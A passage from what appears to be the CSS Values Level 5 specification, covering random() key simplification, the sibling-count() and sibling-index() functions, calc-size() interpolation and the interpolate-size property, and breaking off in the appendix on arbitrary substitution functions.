The [margin-bottom](css-box-4.md#propdef-margin-bottom) value has a [random cache name](#random-cache-name) [<random-ua-ident>](#typedef-random-ua-ident) of `"ua-margin-bottom-1"`, which is different from the [margin-top](css-box-4.md#propdef-margin-top) key of `"ua-margin-1"`, so the top and bottom margins will be different random values. [margin-left](css-box-4.md#propdef-margin-left) and [margin-right](css-box-4.md#propdef-margin-right) continue to share a third random value `"ua-margin-2"`, as they still share the name `"margin"` property name and `2` index.

<a id="example-4ea8a8c3"></a> The evaluation semantics of custom properties can make [random functions](#css-random-function) act a little unpredictably if you’re not careful.

For example, in the following:

```
.square-or-rect {
  --size: random(100px, 500px);
  width: var(--size);
  height: var(--size);
}
```

If --size isn’t a registered custom property, or is registered but with the universal grammar *, the [random()](#funcdef-random) function isn’t evaluated (or even recognized *as* a random() function) in --size, so the default rules for an omitted [<random-key>](#typedef-random-key) aren’t applied. Instead, it’s evaluated when it’s substituted into width and height, so each gets a distinct [random cache name](#random-cache-name), and this ends up defining a random *rectangle*, rather than a square.

Similarly, [element-scoped](#valdef-random-element-scoped) in the [<random-key>](#typedef-random-key) won’t cause the function to determine its "element identifier" until substitution actually happens—​which might be *after* --size has inherited through multiple elements—​so again multiple elements using var(--size) would end up with distinct random values rather than sharing one value defined on their ancestor.

The first issue can be resolved, if desired, by specifying a [<dashed-ident>](css-values-4.md#typedef-dashed-ident) explicitly, rather than relying on the defaulting rules.

Both issues can be resolved by instead using a registered custom property with a non-universal grammar, so the [random()](#funcdef-random) function will be parsed and evaluated by the custom property (gaining a [<random-ua-ident>](#typedef-random-ua-ident) of "ua---size-1"), and then the resolved random value will be substituted into each property.

#### <a id="random-simplify"></a>9.4.1. Simplification of [<random-key>](#typedef-random-key)

At parse time, certain transformations are performed on the [<random-key>](#typedef-random-key) of a [random function](#css-random-function):

-
If the [<random-key>](#typedef-random-key) is [auto](#valdef-random-auto) (or omitted), it’s turned into element-scoped property-index-scoped. (And then subject to the below transformations.)
-
If the [<random-key>](#typedef-random-key) contains [property-scoped](#valdef-random-property-scoped) or [property-index-scoped](#valdef-random-property-index-scoped), that keyword is replaced by a [<random-ua-ident>](#typedef-random-ua-ident): either ua-PROPERTY with PROPERTY being the property the value was parsed as, or ua-PROPERTY-INDEX with PROPERTY as the previous and INDEX being the 1-indexed integer index of this [random function](#css-random-function) among all random functions being used in the declaration.
The INDEX value is based on the ordering in the parsed value, before any canonicalization/reordering might occur that could shuffle the values around.

In certain cases, the [<random-ua-ident>](#typedef-random-ua-ident) is slightly more complex:

-
when evaluated inside of a custom function (in a property with a type that causes evaluation, such as a typed argument or a typed result), in addition to the PROPERTY and/or INDEX, the function’s name is captured in the ident: ua-FUNCTIONNAME-PROPERTY or ua-FUNCTIONNAME-PROPERTY-INDEX.
Note: This ensures that different functions that just happen to use the same internal variable names don’t accidentally tie their random values together.
<a id="example-69ace575"></a>
For example, given the following custom function and usage:
```
@function --ex(--arg <length>) returns <length> {
  --local: random(2px, 3px);
  result: calc(var(--arg) + var(--local) + random(3px, 4px));
}
.foo {
  width: --ex(random(1px, 2px));
}
```

The --arg is registered as a [<length>](css-values-4.md#length-value), so it’s value is evaluated within the --arg property, getting a [<random-ua-ident>](#typedef-random-ua-ident) of ua---ex---arg-1.
The --local is *not* registered, so it doesn’t evaluate the [random()](#funcdef-random) at all; it’s left as-is until substitution.
The result is also registered as a [<length>](css-values-4.md#length-value). Both the random(2px, 3px) (from --local substitution) and random(3px, 4px) (written literally) evaluate within result, getting [<random-ua-ident>](#typedef-random-ua-ident)s of ua---ex-result-1 and ua---ex-result-2.
<a id="example-f2b6d6c8"></a> On the other hand, in this example:
```
@function --no-types(--arg) {
  result: calc(var(--arg) + random(2px, 3px));
}
.foo {
  width: --no-types(random(1px, 2px));
}
```

Neither the --arg argument nor the result are typed, so their values aren’t evaluated within the function. The function call substitutes itself with the value calc(random(1px, 2px) + random(2px, 3px)), which is then evaluated within width, getting [<random-ua-ident>](#typedef-random-ua-ident)s of ua-width-1 and ua-width-2 instead.
-
when evaluated inside of an [arbitrary substitution function](#arbitrary-substitution-function) as part of the substitution process, the prefix is ua-early- rather than just ua-: ua-early-PROPERTY or ua-early-PROPERTY-INDEX.
Additionally, if the INDEX portion is included in the ident, it is incremented *separately* from non-"early" usage (that is, the "early" usage counts up from 1, then non-"early" usage will also count up from 1) and increments across substitutions in the property (that is, multiple different [arbitrary substitution functions](#arbitrary-substitution-function) will use successive indexes, rather than resetting to 1 for each substitution).
<a id="example-964bd253"></a> For example, in this relatively complex value:
```
.foo {
  width: calc(
    if(
      style(/*eA*/random(auto, ...) < 0.5):
        /*lA*/random(auto, ...);
      else:
        /*lB*/random(auto, ...))
    )
    +
    if(
      style(/*eB*/random(auto, ...) < 0.5):
        /*lC*/random(auto, ...);
      else:
        /*lD*/random(auto, ...))
    )
  );
}
```

During [replacement](#replace-an-arbitrary-substitution-function), the tests of both [if()](#funcdef-if)s are parsed (since using == or > provides a numeric context, giving the UA the necessary knowledge to evaluate them), resulting in, effectively, the following code:
```
.foo {
  width: calc(
    if(
      style(/*eA*/random(element-scoped ua-early-width-1, ...) < 0.5):
        /*lA*/random(auto, ...);
      else:
        /*lB*/random(auto, ...))
    )
    +
    if(
      style(/*eB*/random(element-scoped ua-early-width-2, ...) < 0.5):
        /*lC*/random(auto, ...);
      else:
        /*lD*/random(auto, ...))
    )
  );
}
```

That is, the two values in the tests have distinct [<random-ua-ident>](#typedef-random-ua-ident)s, and will be element-scoped as well, so every instance on every element will evaluate to distinct values.
Based on these random values, each [if()](#funcdef-if) will substitute itself with one of its two (unevaluated) branches. When these are then parsed according to the width grammar, they will receive "normal" [<random-ua-ident>](#typedef-random-ua-ident)s with their indexes restarting from 1, effectively:
```
.foo {
  width: calc(
    /*lA*/random(element-scoped ua-width-1, ...)
    +
    /*lD*/random(element-scoped ua-width-2, ...)
    )
  );
}
```

Since these are using different [<random-ua-ident>](#typedef-random-ua-ident)s than the "early" ones, their random values will be distinct as well.

These additional modifiers can be combined. For example, if a random(0, 1) is evaluated in the test of an [if()](#funcdef-if) used in the result of a custom function named --foo(), the [<random-ua-ident>](#typedef-random-ua-ident) will be ua-early---foo-result-1.

If the [<random-key>](#typedef-random-key) contains a [<random-ua-ident>](#typedef-random-ua-ident), this must not be omitted in the serialization of the value, even if this would normally be valid per the "shortest serialization principle".

<a id="example-c66e2c64"></a> For example, specifying [margin: random(10px, 20px) random(10px, 20px)](css-box-4.md#propdef-margin) will cause the top and bottom margins to be one random value, and the left and right margins to be another random value. The omitted [<random-key>](#typedef-random-key)s get rewritten at parse-time to element-scoped ua-margin-1 and element-scoped ua-margin-2, respectively, before they expand into the margin longhands.

This way, the [margin-top](css-box-4.md#propdef-margin-top) and [margin-bottom](css-box-4.md#propdef-margin-bottom) longhands will both contain the key element-scoped ua-margin-1, ensuring that the two values remain linked even if you read and then set the value back.

The [random base value](#random-base-value) of a [random function](#css-random-function) is generally known at [specified value](css-cascade-5.md#specified-value) time, once it’s known which element the function is being applied to. As a [math function](css-values-4.md#math-function), a [random()](#funcdef-random) function can be [simplified](css-values-4.md#simplify-a-calculation-tree) as soon as its argument [calculations](css-values-4.md#calc-calculation) can be simplified to compatible numeric values. If a random() function can’t be fully simplified by [computed value](css-cascade-5.md#computed-value) time, then its arguments are maximally simplified, and its specified [<random-key>](#typedef-random-key) is replaced with fixed BASE, where BASE is the function’s random base value.

Note: As an [arbitrary substitution function](#arbitrary-substitution-function), [random-item()](#funcdef-random-item) is always replaced at [computed value](css-cascade-5.md#computed-value) time.

<a id="example-478d1ba1"></a> For example, given the declaration width: random(100px, 100%), the calculations can’t be simplified at [computed value](css-cascade-5.md#computed-value) time because the percentage depend on [used value](css-cascade-5.md#used-value) information (the size of the element’s containing block, to resolve the 100% against).

So, the [computed value](css-cascade-5.md#computed-value) of the property becomes something like width: random(fixed .1234, 100px, 100%). Once the 100% is resolved to a length (say, 500px), the function will be able to fully simplify (to 149.36px).

## <a id="tree-counting"></a>10. Tree Counting Functions: the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) notations

The *<a id="funcdef-sibling-count"></a>sibling-count()* [functional notation](css-values-4.md#functional-notation) represents, as an [<integer>](css-values-4.md#integer-value), the total number of child elements in the parent of the element on which the notation is used.

The *<a id="funcdef-sibling-index"></a>sibling-index()* [functional notation](css-values-4.md#functional-notation) represents, as an [<integer>](css-values-4.md#integer-value), the index of the element on which the notation is used among its inclusive siblings. Like [:nth-child()](selectors-4.md#nth-child-pseudo), [sibling-index()](#funcdef-sibling-index) is 1-indexed.

Together, these are known as the *<a id="tree-counting-functions"></a>tree-counting functions*.

Note: The counter() function can provide similar abilities as [sibling-index()](#funcdef-sibling-index), but returns a [<string>](css-values-4.md#string-value) rather than an [<integer>](css-values-4.md#integer-value).

When used on an element-backed pseudo-element that is also a real element, the [tree-counting functions](#tree-counting-functions) resolve for that real element. For other [pseudo-elements](selectors-4.md#pseudo-element), they resolve as if they were resolved against the [ultimate originating element](selectors-4.md#ultimate-originating-element).

A [tree-counting function](#tree-counting-functions) is a type of loosely-matched tree-scoped reference, which is resolved as if the element were given an automatic tree-scoped name that matches an identical automatic name on the tree-scoped reference of the tree-counting function. If the reference fails to match (because the element is, for example, in a descendent shadow tree from the stylesheet), the function returns 0.

Note: This restriction is to avoid leaking shadow tree information to outer trees.

<a id="example-f9d62804"></a> The following examples show how [sibling-index()](#funcdef-sibling-index) resolves for [pseudo-elements](selectors-4.md#pseudo-element) and across shadow tree boundaries:

```
#target {
  /* Based on the sibling-index() of #target */
  width: calc(sibling-index() * 10px);
}
#target::before {
  /* Based on the sibling-index() of #target */
  width: calc(sibling-index() * 10px);
}
#target::before::marker {
  /* Based on the sibling-index() of #target */
  width: calc(sibling-index() * 10px);
}
::slotted(*)::before {
  /* Based on the sibling-index() of the slotted element in the outer tree */
  width: calc(sibling-index() * 10px);
}
::part(my-part) {
  /* Returns 0px, because referencing a shadow tree */
  width: calc(sibling-index() * 10px);
}
:host {
  /* Based on the host's sibling-index() in the outer tree */
  width: calc(sibling-index() * 10px);
}
```

Note: Like [:nth-child()](selectors-4.md#nth-child-pseudo) and other counting selectors, the [tree-counting functions](#tree-counting-functions) operate on the DOM tree, rather than the flat tree like most CSS operations do. They may, in the future, have variants that support counting flat tree siblings.

Note: These functions may, in the future, be extended to accept an of [<complex-real-selector-list>](selectors-4.md#typedef-complex-real-selector-list) argument, similar to [:nth-child()](selectors-4.md#nth-child-pseudo), to filter on a subset of the children.

## <a id="calc-size"></a>11. Calculating With Intrinsic Sizes: the [calc-size()](#funcdef-calc-size) function

Transitioning between two [<length-percentage>](css-values-4.md#typedef-length-percentage) sizes, or slightly adjusting one, can be done easily with [calc()](css-values-4.md#funcdef-calc): halfway between 100% and 20px is calc(50% + 10px), for example. But these operations are no longer possible if the size you want to adjust or transition to/from is a non-numeric value such as auto or fit-content or a cyclic percentage size. [[CSS-SIZING-3]](#biblio-css-sizing-3)

The *<a id="funcdef-calc-size"></a>calc-size()* function allows math and transition/animation to be performed on these sizes in a safe, well-defined way. Its syntax is as follows:

```
<calc-size()> = calc-size( <calc-size-basis>, <calc-sum> )
<a id="typedef-calc-size-basis"></a><calc-size-basis> = [ <size-keyword> | <calc-sum> | <calc-size()> | any ]
```

The first argument given is the *<a id="calc-size-basis"></a>calc-size basis*, which represents the size the [calc-size()](#funcdef-calc-size) is based on, and the second is the *<a id="calc-size-calculation"></a>calc-size calculation*, which represents the size that calc-size() will actually resolve to, based on the [calc-size basis](#calc-size-basis).

<a id="example-4b9209ec"></a> Some examples:

```
height: calc-size(auto, 0);           /* used height is zero */
height: calc-size(auto, 50%);         /* used height is 50% of the container */
height: calc-size(auto, size / 2);    /* used height is 50% of auto */
height: calc-size(auto, size);        /* used height is auto */
height: calc-size(auto, size + 10px); /* used height is auto + 10px */
height: calc-size(auto, round(up, size, 20px));
                                      /* used height is rounded up to the
                                         nearest multiple of 20px */
height: calc-size(any,  size / 2);    /* declaration is invalid */
```

The [calc-size basis](#calc-size-basis) values are:

***<a id="typedef-calc-size-size-keyword"></a><size-keyword>* **
:

Indicates that the [calc-size()](#funcdef-calc-size) is basing its size off of the specified keyword. Represents any sizing keywords allowed in the context where the function is used. For example, in width, it matches auto, min-content, stretch, etc. Also allows any related sizing functions, like the fit-content() function in width/etc., which is a variation of the fit-content keyword. For all purposes other than actually resolving the size, the calc-size() acts like this keyword.

The [calc-size calculation](#calc-size-calculation) will use the corresponding size as the value of its [size](#valdef-calc-size-size) keyword.

***<a id="valdef-calc-size-calc-sum"></a>[<calc-sum>](css-values-4.md#typedef-calc-sum)* **
:

Indicates that the [calc-size()](#funcdef-calc-size) is basing its size off of the specified [calculation](css-values-4.md#calc-calculation). For all purposes other than actually resolving the size, the calc-size() acts like this calculation wrapped in a [calc()](css-values-4.md#funcdef-calc) (including, for example, whether it represents a definite or indefinite size).

The [calc-size calculation](#calc-size-calculation) will use the corresponding size as the value of its [size](#valdef-calc-size-size) keyword.

***<a id="valdef-calc-size-calc-size"></a>[<calc-size()>](#funcdef-calc-size)* **
:

Indicates that the outer [calc-size()](#funcdef-calc-size) is basing its size off of this inner calc-size(), and will share the same behavior as it.

The [calc-size calculation](#calc-size-calculation) will use the size of the inner [calc-size()](#funcdef-calc-size) as its [size](#valdef-calc-size-size) keyword. The size keyword is allowed, in this case, even if the inner calc-size() uses [any](#valdef-calc-size-any).

<a id="example-82e386de"></a> For example, in calc-size(calc-size(min-content, size / 2), size + 10%), the outer [calc-size()](#funcdef-calc-size) acts as if its [calc-size basis](#calc-size-basis) was min-content, and will calculate its own [size](#valdef-calc-size-size) using the result of the inner calc-size(), equivalent to calc-size(min-content, size / 2 + 10%).

Why can [calc-size()](#funcdef-calc-size) be nested?

Allowing [calc-size()](#funcdef-calc-size) as the basis argument means that authors can use a variable as the basis (like calc-size(var(--foo), size + 20px)) and it will *always work* as long as the variable was originally valid for the property.

Doing the same with just [calc()](css-values-4.md#funcdef-calc) doesn’t work - for example, if you have --foo: calc-size(min-content, size + 20px), or even just --foo: min-content, then calc( (var(--foo)) + 20px ) fails.

The nesting is simplified away during interpolation, and at used-value time, so the basis always ends up as a simple value by the time interpolation and other effects occur; see [§ 11.2.1 Simplifying calc-size()](#simplifying-calc-size).

***<a id="valdef-calc-size-any"></a>any* **
:

Indicates that the [calc-size()](#funcdef-calc-size) does not depend on any additional information, and thus can be interpolated with *any* other size. The calc-size() function represents a definite size.

The [calc-size calculation](#calc-size-calculation) cannot use the [size](#valdef-calc-size-size) keyword; it is a syntax error for size to appear in the calc-size calculation.

Note: calc-size(any, ...) is mostly identical to calc(...), but it is automatically interpolatable with other sizing keywords, regardless of the [interpolate-size](#propdef-interpolate-size) value. (It does treat percentages slightly differently, if the containing block’s size is not definite.)

For the purpose of sizing (including for intrinsic size contributions), [calc-size()](#funcdef-calc-size) resolves to the result of its [calc-size calculation](#calc-size-calculation).

For either argument, if a [<calc-sum>](css-values-4.md#typedef-calc-sum) is given, its type must match [<length-percentage>](css-values-4.md#typedef-length-percentage), and it must resolve to a [<length>](css-values-4.md#length-value). See [CSS Values 4 § 10.9 Type Checking](css-values-4.md#calc-type-checking). Like [calc()](css-values-4.md#funcdef-calc), it inherits the property’s [calculation context](css-values-4.md#calculation-contexts). However, a [<calc-size()>](#funcdef-calc-size) is specifically *not* a <length>; any place that wants to accept calc-size() must explicitly include it in its grammar.

Within the [calc-size calculation](#calc-size-calculation), the *<a id="valdef-calc-size-size"></a>size* is a [<calc-keyword>](css-values-4.md#typedef-calc-keyword) which is a [<length>](css-values-4.md#length-value), and resolves at [used value](css-cascade-5.md#used-value) time to the size specified above.

Why not just allow intrinsic keywords in [calc()](css-values-4.md#funcdef-calc)?

In theory, rather than introducing [calc-size()](#funcdef-calc-size), we could have defined calc(auto * .5) to be valid, allowing interpolation to work as normal.

This has the minor issue that mixing keywords still wouldn’t be allowed, but it wouldn’t be as obvious (that is, calc((min-content + max-content)/2) looks reasonable, but would be disallowed).

The larger issue, though, is that this wouldn’t allow us to smoothly transition percentages. calc(50%) is only half the size of calc(100%) when percentages are definite in the context; if they’re not, the two values will usually be the same size (depending on the context, either 0px or auto-sized).

Using a new function that explicitly separates the size you’re calculating against from the calculation itself lets us get smooth interpolation in *all* cases.

An additional consideration is that there are many effects, some small and some large, that depend on whether an element is intrinsically sized or definite. Consider, for example, margin collapsing. Using [calc()](css-values-4.md#funcdef-calc) would mean that the answer to the question “is the element intrinsically-sized” can have one answer in the middle of a transition (“yes”, for calc(min-content * .2 + 20px * .8))), but a different answer at the end of the transition (“no”, for calc(20px)), causing the layout to jump at the end of an otherwise-smooth transition.

(This issue is similar to the stacking-layer changes that can occur when animating from opacity:1 to [opacity: 0](css-color-4.md#propdef-opacity): any non-1 value forces a stacking context, but 1 does not. With opacity you can get around this by animating to .999, which is visually indistinguishable from 1 but forces a stacking context. It’s not as reasonable to ask people to animate to calc(auto * .0001) to ensure it retains its intrinsic-ness.)

Using a new function that identifies itself as nominally being a keyword size, like calc-size(auto, 20px), means we can maintain stable layout behaviors the entire time, even when the actual size is a definite length.

### <a id="resolving-calc-size"></a>11.1. Resolving [calc-size()](#funcdef-calc-size)

Before [used value](css-cascade-5.md#used-value) time, [calc-size()](#funcdef-calc-size) functions are not resolved or simplified. (But see [§ 11.2 Interpolating calc-size()](#interpolate-calc-size).)

At [used value](css-cascade-5.md#used-value) time, the [calc-size calculation](#calc-size-calculation) is resolved just like the value of a [calc()](css-values-4.md#funcdef-calc) expression, by substituting in the used value of the [calc-size basis](#calc-size-basis) for the [size](#valdef-calc-size-size) keyword in the calc-size calculation, and evaluating any percentages normally (if they are definite) or against 0px (if they are not).

Percentages in the [calc-size basis](#calc-size-basis) resolve as normal so you can always smoothly transition to *any* size, regardless of its value or behavior. For example, calc-size(100%, size) is guaranteed to interpolate smoothly with calc-size(100%, 0px), producing intermediate values like calc-size(100%, size * .5). Without [calc-size()](#funcdef-calc-size), interpolation from 100% to 0px only works as expected if the percentage is definite; otherwise, the intermediate values like calc(50%) might all behave as auto and not change size at all.

Percentages in the [calc-size calculation](#calc-size-calculation), on the other hand, are resolved to 0px when they would otherwise be indefinite, to avoid making the [calc-size()](#funcdef-calc-size) potentially act in two different ways. There are some cases where a min-content size, for example, will cause different layout effects than a 100% size, and so a calc-size() has to commit to one behavior or the other.

### <a id="interpolate-calc-size"></a>11.2. <a id="interp-calc-size"></a> Interpolating [calc-size()](#funcdef-calc-size)

Whether two [calc-size()](#funcdef-calc-size) functions can be interpolated depends on their [calc-size basis](#calc-size-basis) values (after being [prepared for interpolation](#calc-size-prepare-for-interpolation)):

**If either function returned failure from being [prepared for interpolation](#calc-size-prepare-for-interpolation) **
:

The values cannot be interpolated.

**If they are identical **
:

The result’s [calc-size basis](#calc-size-basis) is that basis value.

**If either is [any](#valdef-calc-size-any) **
:

The result’s [calc-size basis](#calc-size-basis) is the non-[any](#valdef-calc-size-any) basis.

**Otherwise (if they don’t match and neither side is [any](#valdef-calc-size-any)) **
:

The values cannot be interpolated.

If they can be interpolated, the result’s [calc-size calculation](#calc-size-calculation) is the interpolation of the two input calc-size calculations.

Note: These interpolation restrictions ensure that a [calc-size()](#funcdef-calc-size) doesn’t try to act in two different ways at once. There are some cases where a min-content and max-content would produce different layout behaviors, for example, so the calc-size() has to masquerade as one or the other. This, unfortunately, means you can’t transition between keywords, like going from auto to min-content.

Some [calc-size()](#funcdef-calc-size) values can also be interpolated with a [<length-percentage>](css-values-4.md#typedef-length-percentage) or an [<size-keyword>](#typedef-calc-size-size-keyword). To determine whether the values can interpolate and what the interpolation behavior is, treat the non-calc-size() value as calc-size(any, *value* ) if the value is a [<calc-sum>](css-values-4.md#typedef-calc-sum) or as calc-size( *value* , size) otherwise, and apply the rules above.

<a id="example-4f69fe99"></a> For example, [calc-size()](#funcdef-calc-size) allows interpolation to/from height: auto:

```
details {
  transition: height 1s;
}
details::details-content {
  display: block;
}
details[open]::details-content {
  height: auto;
}
details:not([open])::details-content {
  height: calc-size(any, 0px);
}
```

This will implicitly interpolate between calc-size(auto, size) and calc-size(any, 0px). Half a second after opening the `details`, the ::details-content wrapper’s height will be calc-size(auto, size * .5), half its open size; thruout the transition it’ll smoothly animate its height.

Note: These rules allow calc-size(any, definite length) to *always* interpolate smoothly, regardless of how the other side of the transition is specified.

Note: This "upgrade a plain value into a [calc-size()](#funcdef-calc-size)" behavior puts [<length-percentage>](css-values-4.md#typedef-length-percentage) values into the [calc-size calculation](#calc-size-calculation). This allows values with percentages to interpolate with intrinsic size keywords, but does mean that when a percentage isn’t definite, it’ll resolve to zero. If you want to resolve to the actual size the percentage would make the element, explicitly write a calc-size() with the value in its [calc-size basis](#calc-size-basis), like calc-size(50%, size).

#### <a id="simplifying-calc-size"></a>11.2.1. Simplifying [calc-size()](#funcdef-calc-size)

Identically to [math functions](css-values-4.md#math-function), the [calc-size calculation](#calc-size-calculation) (and [calc-size basis](#calc-size-basis), if it’s a [<calc-sum>](css-values-4.md#typedef-calc-sum)) of a [calc-size()](#funcdef-calc-size) function is [simplified](css-values-4.md#simplify-a-calculation-tree) at [specified value](css-cascade-5.md#specified-value) and [computed value](css-cascade-5.md#computed-value) time.

Before [interpolation](css-values-4.md#interpolation), [calc-size()](#funcdef-calc-size) functions are [prepared for interpolation](#calc-size-prepare-for-interpolation) so their [calc-size basises](#calc-size-basis) can be compared, and their [calc-size calculations](#calc-size-calculation) can be interpolated properly. This is a more involved process than [simplifying a calculation tree](css-values-4.md#simplify-a-calculation-tree), and can potentially fail.

To *<a id="calc-size-prepare-for-interpolation"></a>prepare for interpolation* a [calc-size()](#funcdef-calc-size) function:

1. First, simplify the [calc-size basis](#calc-size-basis), recursing as needed:
**If the [calc-size basis](#calc-size-basis) is a [calc-size()](#funcdef-calc-size) function itself **
:
The [calc-size basis](#calc-size-basis) of the outer function is replaced with that of the inner function, and the inner function’s [calc-size calculation](#calc-size-calculation) is [substituted](#substitute-into-a-calc-size-calculation) into the outer function’s calc-size calculation.
**Otherwise, if the [calc-size basis](#calc-size-basis) is a [<calc-sum>](css-values-4.md#typedef-calc-sum) whose type matches [<length>](css-values-4.md#length-value) (no percentage present) **
:
Replace the basis with any, and the original basis is [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).
**Otherwise, if the [calc-size basis](#calc-size-basis) is any other [<calc-sum>](css-values-4.md#typedef-calc-sum) (contains a percentage) **
:
Replace the basis with 100% and the original basis is [de-percentified](#de-percentify-a-calc-size-calculation), then [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).
If any [substitute into a calc-size calculation](#substitute-into-a-calc-size-calculation) returns failure, the entire operation immediately returns failure.
2. Next, simplify the [calc-size calculation](#calc-size-calculation) as defined in [CSS Values 4 § 10.10.1 Simplification](css-values-4.md#calc-simplification).

Note: After simplification, the [calc-size basis](#calc-size-basis) of a [calc-size()](#funcdef-calc-size) function will either be a single keyword or the value 100%.

To *<a id="substitute-into-a-calc-size-calculation"></a>substitute into a calc-size calculation* *calc* a value *insertion value*:

1.
If *calc* doesn’t have the [size](#valdef-calc-size-size) keyword in it, do nothing.
2.
Otherwise, replace every instance of the [size](#valdef-calc-size-size) keyword in *calc* with *insertion value*, wrapped in parentheses.
3.
If this substitution would produce a value larger than an UA-defined limit, return failure.
Note: This is intentionally identical to the protection against substitution attacks defined for variable substitution; see [CSS Variables 1 § 3.3 Safely Handling Overly-Long Variables](css-variables-1.md#long-variables). However, the use-cases for very long [calc-size()](#funcdef-calc-size) values are much less than for long custom properties, so UAs might wish to impose a smaller size limit.

To *<a id="de-percentify-a-calc-size-calculation"></a>de-percentify a calc-size calculation* *calc*:

1.
Replace every instance of a [<percentage-token>](css-syntax-3.md#typedef-percentage-token) in *calc* with (size * N), where N is the percentage’s value divided by 100. Return *calc*.

Note: For example, 50% + 20px becomes (size * .5) + 20px.

Why are percentages simplified in this way?

This percentage simplification ensures that transitions work linearly.

For example, say that 100% resolves to 100px.

If you transitioned from calc-size(100px, size * 2) (resolves to 200px) to calc-size(50%, size - 20px) (resolves to 30px) by interpolating both the arguments, then at the halfway point you’d have calc-size(75px, size * 2 * .5 + (size - 20px) * .5) (resolves to 102.5px), which is *not* halfway between 30 and 200 (that would be 115px). Interpolating one argument, then substituting it into another calculation and interpolating that one too, generally gives *quadratic* interpolation behavior.

Instead, we substitute the basis arg into the calculation arg, so you get calc-size(any, 100px * 2) and calc-size(100%, (size * .5) - 20px), and when interpolated, at the halfway point you get calc-size(100%, 100px * 2 * .5 + ((size * .5) - 20px) * .5), which does indeed resolve to 115px, as expected. Other points in the transition are similarly linear.

### <a id="interpolate-size"></a>11.3. Automatically interpolating sizing keywords: the [interpolate-size](#propdef-interpolate-size) property

| Name: | *<a id="propdef-interpolate-size"></a>interpolate-size* |
| --- | --- |
| [Value:](css-values-4.md#value-defs) | numeric-only [\|](css-values-4.md#comb-one) allow-keywords |
| [Initial:](css-cascade-5.md#initial-values) | numeric-only |
| [Applies to:](css-cascade-5.md#applies-to) | all elements |
| [Inherited:](css-cascade-5.md#inherited-property) | yes |
| [Percentages:](css-values-4.md#percentages) | n/a |
| [Computed value:](css-cascade-5.md#computed) | as specified |
| Canonical order: | per grammar |
| Animation type: | not animatable |

This property allows keywords on the sizing properties to smoothly combine with [<length-percentage>](css-values-4.md#typedef-length-percentage) values rather than using discrete animation for this case. (See Web Animations § 5.2 Animating properties.)

***<a id="valdef-interpolate-size-numeric-only"></a>numeric-only* **
: A [<size-keyword>](#typedef-calc-size-size-keyword) can only be combined with a compatible [<calc-size()>](#funcdef-calc-size).
***<a id="valdef-interpolate-size-allow-keywords"></a>allow-keywords* **
: Sizing values can also be combined if one of them is an [<size-keyword>](#typedef-calc-size-size-keyword) and the other is a [<length-percentage>](css-values-4.md#typedef-length-percentage). This is done by treating the <size-keyword> *keyword* as though it is calc-size(*keyword*, size) and applying the rules in [§ 11.2 Interpolating calc-size()](#interpolate-calc-size). In other cases, a <size-keyword> still cannot be interpolated.
Note: Setting [allow-keywords](#valdef-interpolate-size-allow-keywords) allows *most* size values to be interpolated, but not all; different keywords are still not interpolable with each other, as layout algorithms can change their behavior based on precisely which sizing keyword a descendant is using, in a way that can’t be represented during interpolation.

Note: Setting [allow-keywords](#valdef-interpolate-size-allow-keywords) *mostly* removes the need to use [calc-size()](#funcdef-calc-size) manually, but there are still some cases that can benefit from using it. For example, if the containing block size is indefinite, naively interpolating width: 100% to width: 0px won’t work as expected (since the intermediate values might behave as auto, making them the same size as 100%), but manually writing width: calc-size(100%, size); and/or width: calc-size(any, 0px); will, causing the element to smoothly interpolate between the two values.

Note: If we had a time machine, this property wouldn’t exist; the [allow-keywords](#valdef-interpolate-size-allow-keywords) behavior would just be how things worked by default. It exists because many existing style sheets assume that the sizing keywords (auto, min-content, etc.) cannot interpolate at all, and would produce broken behavior if they started interpolating. For compatibility with this assumption, allowing this interpolation requires an opt-in. Because the property inherits, specifying :root { interpolate-size: allow-keywords; } allows the new behavior for the entire page. We suggest doing this wherever compatibility isn’t an issue.

The value of [interpolate-size](#propdef-interpolate-size) that matters is the [computed value](css-cascade-5.md#computed-value) on the element at the time the animation might start. For CSS transitions, this means the value in the after-change style. An animation is not stopped or started later because interpolate-size changes.

## <a id="arbitrary-substitution"></a> Appendix A: Arbitrary Substitution Functions

An *<a id="arbitrary-substitution-function"></a>arbitrary substitution function* is a [functional notation](css-values-4.md#functional-notation) that will, when resolved, substitute itself with other values that are unknowable at parse time.

### <a id="substitution"></a> Substitution

Each [arbitrary substitution function](#arbitrary-substitution-function) must define how to *<a id="replace-an-arbitrary-substitution-function"></a>replace an arbitrary substitution function* for itself, given a list of arguments and a stack of [substitution contexts](#substitution-context), and likely involving further [substitution](#substitute-arbitrary-substitution-function). It must return a sequence of [component values](css-syntax-3.md#component-value) (fully resolved, so no further arbitrary substitution functions exist in the sequence), which it will be replaced by.

A function’s [replacement](#replace-an-arbitrary-substitution-function) algorithm is called with the results of [early substitution](#early-resolution) and parsing with the function’s [argument grammar](#argument-grammar), but nothing more. The algorithm will have to further [substitute](#substitute-arbitrary-substitution-function) each argument it deals with, before [parsing](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) it as the appropriate part of its *normal* grammar, and then performing whatever logic it needs.

It might leave some arguments completely unsubstituted (for example, the fallback argument of an [attr()](#funcdef-attr) function, if the attribute value exists and correctly parses), or only parse some arguments based on the results of evaluating other arguments (for example, later [<if-condition>](#typedef-if-condition) values in an [if()](#funcdef-if) function are only evaluated if earlier ones evaluated as false, and only the result in the "successful" [<if-branch>](#typedef-if-branch) is evaluated).

To *<a id="substitute-arbitrary-substitution-function"></a>substitute arbitrary substitution functions* in a sequence of [component values](css-syntax-3.md#component-value) *values*, given an optional [substitution context](#substitution-context) *context*:

1.
[Guard](#guarded) *context* for the remainder of this algorithm. If *context* is marked as a [cyclic substitution context](#cyclic-substitution-contexts), return the guaranteed-invalid value.
2.
For each [arbitrary substitution function](#arbitrary-substitution-function) *func* in *values* (ordered via a depth-first pre-order traversal) that is not nested in the contents of another arbitrary substitution function:
  1.
  [Substitute early-invoked functions](#substitute-early-invoked-functions) in *func*’s contents, and let *early result* be the result.
  2.
  If *early result* contains the guaranteed-invalid value, replace *func* in *values* with the guaranteed-invalid value and continue.
  3.
  [Parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) *early result* according to *func*’s [argument grammar](#argument-grammar). If this returns failure, replace *func* in values with the guaranteed-invalid value and continue; otherwise, let *arguments* be the result.
  4.
